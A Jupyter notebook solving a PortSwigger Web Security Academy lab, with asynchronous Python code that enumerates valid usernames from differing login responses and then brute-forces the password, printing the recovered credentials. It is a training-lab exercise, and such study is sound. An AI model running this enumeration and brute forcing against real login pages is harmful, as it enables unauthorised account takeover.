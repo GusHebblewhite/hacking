{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b357b798",
   "metadata": {},
   "source": [
    "# Password Based Login - Username Enumeration: Different Responses (Async)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7fb1b012",
   "metadata": {},
   "source": [
    "This notebook demonstrates how to perform GET/POST requests in an asynchronous manner. I've played around and tried to work out the fastest way to do this, and I even have a nice tqdm loading bar to track the progress.\n",
    "\n",
    "This might be useful for web scraping and brute forcing."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b820a1b5",
   "metadata": {},
   "source": [
    "We'll essentially try to do username enumeration plus password brute forcing. The lab descrption is here: \n",
    "\n",
    "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "3f160af4",
   "metadata": {},
   "outputs": [],
   "source": [
    "import aiohttp\n",
    "import asyncio\n",
    "import async_timeout\n",
    "import os\n",
    "import tqdm.notebook as tq\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()\n",
    "\n",
    "from load_un_pw import get_un_pw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9b65c778",
   "metadata": {},
   "outputs": [],
   "source": [
    "usernames, passwords = get_un_pw()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a364941",
   "metadata": {},
   "source": [
    "## Enumerate Usernames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "226eb071",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2a77f0c3b72a4f05b1f0ad8472538b46",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/101 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "URL = \"https://ac861fe81e68b541c0cea93a00f100cf.web-security-academy.net/\"\n",
    "\n",
    "#Loop through usernames performing ansynchronous requests\n",
    "#This does use global variables, which is think is OK in this context given it's just a small script\n",
    "\n",
    "async def test_uname(session, each_username):\n",
    "    async with session.post(URL + \"login\", data={\"username\" : each_username, \"password\" : \"test123\"}) as response:\n",
    "        return [each_username, 'Invalid username' in await response.text()]\n",
    "\n",
    "        \n",
    "async def main():\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        tasks = [test_uname(session, each_username) for each_username in usernames]\n",
    "    \n",
    "        return [await f for f in tq.tqdm(asyncio.as_completed(tasks), total = len(tasks))]\n",
    "    \n",
    "\n",
    "results = asyncio.run(main())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fa7605b",
   "metadata": {},
   "source": [
    "Now we can easily find the username of the valid user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "5a317895",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['austin']"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "valid_username = [x[0] for x in results if x[1]==False]\n",
    "valid_username"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5e07bc4a",
   "metadata": {},
   "source": [
    "## Password guessing\n",
    "Now to brute force the password. Same basic method."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ec707797",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "95b8e061dbec482bb121fb9e63cfecdd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "async def try_password(session, each_password):\n",
    "    async with session.post(URL + \"login\", \n",
    "                      data = {\"username\" : valid_username, \"password\" : each_password}\n",
    "                     ) as response:\n",
    "        return [each_password, \"Your username is:\" in await response.text()]\n",
    "    \n",
    "async def password_brute_force():\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        tasks = [try_password(session, x) for x in passwords]\n",
    "        return [await f for f in tq.tqdm(asyncio.as_completed(tasks), total=len(tasks))]\n",
    "        \n",
    "results = asyncio.run(password_brute_force())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "802a7fb0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'2000'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "valid_password = [x[0] for x in results if x[1] == True][0]\n",
    "valid_password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7b69ba02",
   "metadata": {},
   "source": [
    "Yay! The whole script runs in only a couple of seconds. Pretty cool hey."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "58d6f935",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
